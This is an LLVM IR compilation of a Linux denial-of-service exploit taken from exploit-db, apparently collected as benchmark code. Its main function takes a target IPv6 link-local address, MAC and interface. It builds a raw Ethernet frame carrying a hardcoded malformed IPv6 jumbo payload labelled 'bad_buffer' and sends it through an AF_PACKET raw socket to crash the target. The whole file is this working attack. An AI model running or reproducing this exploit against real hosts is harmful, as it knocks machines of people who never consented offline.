; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_4893.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_4893.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.ethhdr = type { i32 }
%struct.sockaddr_ll = type { i32, i32, i32, i32, i32, i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [68 x i8] c"usage: ./ipv6_jumbo_crash <fe80::1:2:3> <00:11:22:33:44:55> <eth0>\0A\00", align 1
@.str.1 = private unnamed_addr constant [18 x i8] c"%x:%x:%x:%x:%x:%x\00", align 1
@MY_FRAME_LEN = common dso_local global i32 0, align 4
@__const.main.src_mac = private unnamed_addr constant [6 x i8] c"\00\11\223DU", align 1
@__const.main.src_ip = private unnamed_addr constant [16 x i8] c"\FE\80\00\00\00\00\00\00\00\00\00\00\00\00\00\02", align 16
@AF_PACKET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@ETH_P_ALL = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [28 x i8] c"cannot create socket: [%d]\0A\00", align 1
@PF_PACKET = common dso_local global i32 0, align 4
@ETH_P_IP = common dso_local global i32 0, align 4
@ARPHRD_ETHER = common dso_local global i32 0, align 4
@PACKET_OTHERHOST = common dso_local global i32 0, align 4
@ETH_ALEN = common dso_local global i32 0, align 4
@__const.main.bad_buffer = private unnamed_addr constant [45 x i8] c"`;P\15\04\08\00\A0\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00Cn\C2\05#", align 16
@.str.3 = private unnamed_addr constant [28 x i8] c"could not send frame: [%d]\0A\00", align 1
@.str.4 = private unnamed_addr constant [51 x i8] c"frame send to ip [%s] with mac [%s] on iface [%s]\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [7 x i8], align 1
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca %struct.ethhdr*, align 8
  %12 = alloca [6 x i8], align 1
  %13 = alloca [16 x i8], align 16
  %14 = alloca i32, align 4
  %15 = alloca %struct.sockaddr_ll, align 4
  %16 = alloca [45 x i8], align 16
  %17 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %18 = load i32, i32* %4, align 4
  %19 = icmp slt i32 %18, 4
  br i1 %19, label %20, label %23

20:                                               ; preds = %2
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str, i64 0, i64 0))
  %22 = call i32 @exit(i32 1) #4
  unreachable

23:                                               ; preds = %2
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 1
  %26 = load i8*, i8** %25, align 8
  %27 = call i8* @resolve6(i8* %26)
  store i8* %27, i8** %6, align 8
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 2
  %30 = load i8*, i8** %29, align 8
  %31 = getelementptr inbounds [7 x i8], [7 x i8]* %7, i64 0, i64 0
  %32 = bitcast i8* %31 to i32*
  %33 = getelementptr inbounds [7 x i8], [7 x i8]* %7, i64 0, i64 1
  %34 = bitcast i8* %33 to i32*
  %35 = getelementptr inbounds [7 x i8], [7 x i8]* %7, i64 0, i64 2
  %36 = bitcast i8* %35 to i32*
  %37 = getelementptr inbounds [7 x i8], [7 x i8]* %7, i64 0, i64 3
  %38 = bitcast i8* %37 to i32*
  %39 = getelementptr inbounds [7 x i8], [7 x i8]* %7, i64 0, i64 4
  %40 = bitcast i8* %39 to i32*
  %41 = getelementptr inbounds [7 x i8], [7 x i8]* %7, i64 0, i64 5
  %42 = bitcast i8* %41 to i32*
  %43 = call i32 @sscanf(i8* %30, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.1, i64 0, i64 0), i32* %32, i32* %34, i32* %36, i32* %38, i32* %40, i32* %42)
  %44 = load i8**, i8*** %5, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 3
  %46 = load i8*, i8** %45, align 8
  store i8* %46, i8** %8, align 8
  %47 = load i32, i32* @MY_FRAME_LEN, align 4
  %48 = call i64 @malloc(i32 %47)
  %49 = inttoptr i64 %48 to i8*
  store i8* %49, i8** %9, align 8
  %50 = load i8*, i8** %9, align 8
  store i8* %50, i8** %10, align 8
  %51 = load i8*, i8** %10, align 8
  %52 = bitcast i8* %51 to %struct.ethhdr*
  store %struct.ethhdr* %52, %struct.ethhdr** %11, align 8
  %53 = bitcast [6 x i8]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %53, i8* align 1 getelementptr inbounds ([6 x i8], [6 x i8]* @__const.main.src_mac, i32 0, i32 0), i64 6, i1 false)
  %54 = bitcast [16 x i8]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %54, i8* align 16 getelementptr inbounds ([16 x i8], [16 x i8]* @__const.main.src_ip, i32 0, i32 0), i64 16, i1 false)
  %55 = load i32, i32* @AF_PACKET, align 4
  %56 = load i32, i32* @SOCK_RAW, align 4
  %57 = load i32, i32* @ETH_P_ALL, align 4
  %58 = call i32 @htons(i32 %57)
  %59 = call i32 @socket(i32 %55, i32 %56, i32 %58)
  store i32 %59, i32* %14, align 4
  %60 = load i32, i32* %14, align 4
  %61 = icmp slt i32 %60, 0
  br i1 %61, label %62, label %66

62:                                               ; preds = %23
  %63 = load i32, i32* %14, align 4
  %64 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.2, i64 0, i64 0), i32 %63)
  %65 = call i32 @exit(i32 1) #4
  unreachable

66:                                               ; preds = %23
  %67 = load i32, i32* @PF_PACKET, align 4
  %68 = getelementptr inbounds %struct.sockaddr_ll, %struct.sockaddr_ll* %15, i32 0, i32 5
  store i32 %67, i32* %68, align 4
  %69 = load i32, i32* @ETH_P_IP, align 4
  %70 = call i32 @htons(i32 %69)
  %71 = getelementptr inbounds %struct.sockaddr_ll, %struct.sockaddr_ll* %15, i32 0, i32 4
  store i32 %70, i32* %71, align 4
  %72 = load i8*, i8** %8, align 8
  %73 = call i32 @if_nametoindex(i8* %72)
  %74 = getelementptr inbounds %struct.sockaddr_ll, %struct.sockaddr_ll* %15, i32 0, i32 3
  store i32 %73, i32* %74, align 4
  %75 = load i32, i32* @ARPHRD_ETHER, align 4
  %76 = getelementptr inbounds %struct.sockaddr_ll, %struct.sockaddr_ll* %15, i32 0, i32 2
  store i32 %75, i32* %76, align 4
  %77 = load i32, i32* @PACKET_OTHERHOST, align 4
  %78 = getelementptr inbounds %struct.sockaddr_ll, %struct.sockaddr_ll* %15, i32 0, i32 1
  store i32 %77, i32* %78, align 4
  %79 = load i32, i32* @ETH_ALEN, align 4
  %80 = getelementptr inbounds %struct.sockaddr_ll, %struct.sockaddr_ll* %15, i32 0, i32 0
  store i32 %79, i32* %80, align 4
  %81 = load i8*, i8** %9, align 8
  %82 = getelementptr inbounds [7 x i8], [7 x i8]* %7, i64 0, i64 0
  %83 = load i32, i32* @ETH_ALEN, align 4
  %84 = call i32 @memcpy(i8* %81, i8* %82, i32 %83)
  %85 = load i8*, i8** %9, align 8
  %86 = load i32, i32* @ETH_ALEN, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr i8, i8* %85, i64 %87
  %89 = getelementptr inbounds [6 x i8], [6 x i8]* %12, i64 0, i64 0
  %90 = load i32, i32* @ETH_ALEN, align 4
  %91 = call i32 @memcpy(i8* %88, i8* %89, i32 %90)
  %92 = load %struct.ethhdr*, %struct.ethhdr** %11, align 8
  %93 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %92, i32 0, i32 0
  store i32 56710, i32* %93, align 4
  %94 = bitcast [45 x i8]* %16 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %94, i8* align 16 getelementptr inbounds ([45 x i8], [45 x i8]* @__const.main.bad_buffer, i32 0, i32 0), i64 45, i1 false)
  %95 = load i8*, i8** %9, align 8
  %96 = getelementptr i8, i8* %95, i64 14
  %97 = getelementptr inbounds [45 x i8], [45 x i8]* %16, i64 0, i64 0
  %98 = load i32, i32* @MY_FRAME_LEN, align 4
  %99 = call i32 @memcpy(i8* %96, i8* %97, i32 %98)
  %100 = load i8*, i8** %9, align 8
  %101 = getelementptr i8, i8* %100, i64 22
  %102 = getelementptr inbounds [16 x i8], [16 x i8]* %13, i64 0, i64 0
  %103 = call i32 @memcpy(i8* %101, i8* %102, i32 16)
  %104 = load i8*, i8** %9, align 8
  %105 = getelementptr i8, i8* %104, i64 38
  %106 = load i8*, i8** %6, align 8
  %107 = call i32 @memcpy(i8* %105, i8* %106, i32 16)
  store i32 0, i32* %17, align 4
  %108 = load i32, i32* %14, align 4
  %109 = load i8*, i8** %9, align 8
  %110 = load i32, i32* @MY_FRAME_LEN, align 4
  %111 = bitcast %struct.sockaddr_ll* %15 to %struct.sockaddr*
  %112 = call i32 @sendto(i32 %108, i8* %109, i32 %110, i32 0, %struct.sockaddr* %111, i32 24)
  store i32 %112, i32* %17, align 4
  %113 = load i32, i32* %17, align 4
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %119

115:                                              ; preds = %66
  %116 = load i32, i32* %17, align 4
  %117 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.3, i64 0, i64 0), i32 %116)
  %118 = call i32 @exit(i32 1) #4
  unreachable

119:                                              ; preds = %66
  %120 = load i8**, i8*** %5, align 8
  %121 = getelementptr inbounds i8*, i8** %120, i64 1
  %122 = load i8*, i8** %121, align 8
  %123 = load i8**, i8*** %5, align 8
  %124 = getelementptr inbounds i8*, i8** %123, i64 2
  %125 = load i8*, i8** %124, align 8
  %126 = load i8**, i8*** %5, align 8
  %127 = getelementptr inbounds i8*, i8** %126, i64 3
  %128 = load i8*, i8** %127, align 8
  %129 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.4, i64 0, i64 0), i8* %122, i8* %125, i8* %128)
  br label %130

130:                                              ; preds = %119
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i8* @resolve6(i8*) #1

declare dso_local i32 @sscanf(i8*, i8*, i32*, i32*, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @malloc(i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @if_nametoindex(i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
